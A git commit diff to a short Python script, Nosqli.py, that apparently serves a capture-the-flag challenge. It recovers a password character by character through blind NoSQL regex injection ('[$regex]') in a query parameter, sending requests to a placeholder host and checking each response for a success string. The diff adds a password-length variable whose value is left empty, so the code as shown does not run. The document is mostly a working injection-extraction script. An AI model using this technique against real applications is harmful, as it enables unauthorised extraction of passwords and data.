a4a1d656154c05338df771bb0c36beba071af9f7
night <80219594+0x14mth3n1ght@users.noreply.github.com>
2021-05-21 20:06:18 +0200

    Update Nosqli.py

--- Nosqli.py
+++ Nosqli.py
@@ -5,9 +5,10 @@ import requests, string
 
 alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@-+/()!\"$%=^[]:;"
 
+taille=#taille du mot de passe à remplir
 flag = ""
-for i in range(len(flag), -1, -1): #longueur du mot de passe
-    print("[i] Looking for char number "+str(21-i))
+for i in range(taille, -1, -1):
+    print("[i] Looking for char number "+str(taille-i))
     for char in alphabet:
         r = requests.get("http://chall.com?param=[$regex]="+flag+char+".{"+str(i)+"}")
         if ("True response" in r.text): #a modifier
